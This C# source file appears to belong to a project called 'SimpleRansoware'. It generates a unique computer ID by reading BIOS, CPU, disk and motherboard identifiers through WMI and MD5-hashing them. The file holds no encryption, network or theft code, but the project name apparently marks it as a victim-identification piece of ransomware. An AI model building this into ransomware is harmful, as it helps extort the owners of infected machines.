using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace SimpleRansoware
{
    /// <summary>
    /// Generate Unique Computer ID
    /// </summary>
    public class ComputerIdStrategy
    {
        private const string HARDWARE_INFO = 
            
            // BIOS
            "Win32_BIOS;Manufacturer@Win32_BIOS;SMBIOSBIOSVersion@Win32_BIOS;IdentificationCode@Win32_BIOS;SerialNumber@Win32_BIOS;ReleaseDate@Win32_BIOS;Version"
            
            + "@" +

            // Processor
            "Win32_Processor;ProcessorId@Win32_Processor;Manufacturer"

            + "@" +

            // HDD
            "Win32_DiskDrive;Model@Win32_DiskDrive;Manufacturer@Win32_DiskDrive;Signature@Win32_DiskDrive;TotalHeads"

            + "@" +

            // BOARD
            "Win32_BaseBoard;Model@Win32_BaseBoard;Manufacturer@Win32_BaseBoard;Name@Win32_BaseBoard;SerialNumber";
        
        /// <summary>
        /// Generates a Unique FingerPrint
        /// </summary>
        public static void GenerateFP(ref string id)
        {
            StringBuilder sb = new StringBuilder();

            string[] spec = HARDWARE_INFO.Split('@');

            foreach (string mainSpec in spec)
            {
                string[] innerSpec = mainSpec.Split(';');

                string identifier = GetIdentifier(innerSpec[0], innerSpec[1]);

                sb.AppendLine(identifier);

                Common.ClearString(ref identifier);
            }

            id = GetHash(sb.ToString());
        }

        private static string GetHash(string s)
        {
            MD5 sec = new MD5CryptoServiceProvider();
            ASCIIEncoding enc = new ASCIIEncoding();
            byte[] bt = enc.GetBytes(s);
            return GetHexString(sec.ComputeHash(bt));
        }

        private static string GetHexString(byte[] bt)
        {
            string s = string.Empty;
            for (int i = 0; i < bt.Length; i++)
            {
                byte b = bt[i];
                int n, n1, n2;
                n = (int)b;
                n1 = n & 15;
                n2 = (n >> 4) & 15;
                if (n2 > 9)
                    s += ((char)(n2 - 10 + (int)'A')).ToString();
                else
                    s += n2.ToString();
                if (n1 > 9)
                    s += ((char)(n1 - 10 + (int)'A')).ToString();
                else
                    s += n1.ToString();
                if ((i + 1) != bt.Length && (i + 1) % 2 == 0) s += "-";
            }
            return s;
        }

        private static string GetIdentifier(string wmiClass, string wmiProperty)
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementObject mo in moc)
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch
                    {
                        result = "foo";
                    }
                }
            }
            return result;
        }
    }
}
